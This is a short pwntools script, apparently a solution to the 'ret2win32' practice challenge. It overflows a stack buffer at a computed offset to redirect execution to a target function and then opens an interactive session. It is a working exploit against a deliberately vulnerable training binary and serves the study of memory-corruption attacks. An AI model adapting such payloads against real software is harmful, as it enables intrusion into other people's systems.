from pwn import *

context.update(os='linux', arch='i386', log_level='debug')
io = process("./ret2win32")

# target function
ret2win = 0x804862c


def gen_payload(size: int) -> bytes:
    offset = cyclic_find("laaa", n=4)
    log.info(f"offset: {offset}")

    payload = b""
    payload += b"A" * offset
    payload += p32(ret2win)
    payload += b"C" * (size - len(payload))

    return payload


io.sendlineafter(b"> ", gen_payload(size=80))
io.interactive()
